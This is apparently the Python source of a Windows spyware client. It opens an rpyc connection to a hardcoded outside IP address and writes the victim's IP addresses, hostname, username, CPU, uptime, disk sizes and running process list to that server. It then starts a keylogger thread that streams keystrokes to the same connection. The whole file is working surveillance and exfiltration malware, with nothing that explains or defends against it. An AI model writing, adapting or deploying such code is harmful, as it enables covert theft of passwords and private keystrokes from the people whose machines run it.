import rpyc
import platform
import socket
import re
import urllib
from includes.keylog import *
from includes.wininfo import *

def main():
    
    conn = connect("67.23.25.86")
    
	## You will notice message_header and tmp_header
	## these are just related to output formating
    message_header = "" * 60  
    tmp_header = "=" * (abs(int(len("NEW USER CONNECTED!")) - 60) / 2 )
    conn.modules.sys.stdout.write("\n" + tmp_header  + "NEW USER CONNECTED!" + tmp_header + "\n\n")
    
    windows = WinInfo()
    
    ## Start piping out Connection Information
    title = " **Connection Information** "
    tmp_header = "*" * (abs(int(len(title)) - 60) / 2 )
    conn.modules.sys.stdout.write(tmp_header  + title + tmp_header)
    
    remoteip = "\nRemote IP Address: %s\n" % (windows.get_RemoteIP())
    localip= "Local IP Address: %s\n" % (socket.gethostbyname_ex(socket.gethostname())[2][0])
    hostname = "Hostname: %s\n" % (socket.gethostname()) 
    raw_cpu = "CPU: %s" % (windows.get_Cpu())
    cpu = re.sub("\s+" , " ", raw_cpu) + "\n"
    username = "UserName: %s\n" % (windows.get_display_name())
    system_uptime = "System Uptime: %s Hours\n" % (windows.systemUptime())
    
    drive = 'C:'
    totalsize = 'TotalSize of %s = %f GB\n' % (drive, windows.get_TotalSize(drive))
    freespace =  'FreeSpace on %s = %f GB\n' % (drive, windows.get_FreeSpace(drive))

    
    
    conn.modules.sys.stdout.write(remoteip)
    conn.modules.sys.stdout.write(localip)
    conn.modules.sys.stdout.write(hostname)
    conn.modules.sys.stdout.write(username)
    conn.modules.sys.stdout.write(cpu)
    conn.modules.sys.stdout.write(system_uptime)
    conn.modules.sys.stdout.write(totalsize)
    conn.modules.sys.stdout.write(freespace)
	##

    ## Process List output
    title = "Process List"
    tmp_header = "*" * (abs(int(len(title)) - 60) / 2 )
    process_list = windows.processList().__str__()
    conn.modules.sys.stdout.write(tmp_header  + title + tmp_header)
    conn.modules.sys.stdout.write(process_list)
    ##
    
    ## KEY LoG
    logger = Keylog(conn)
    logger.setDaemon(False)
    title = "Key Logger Started"
    tmp_header = "=" * (abs(int(len(title)) - 60) / 2 )
    conn.modules.sys.stdout.write(tmp_header  + title + tmp_header + "\n")
    logger.start()
    ##
    
    
    ### Function ###
    

    
def connect(server):
    return rpyc.classic.connect(server)
    

if __name__ == "__main__":
    main()
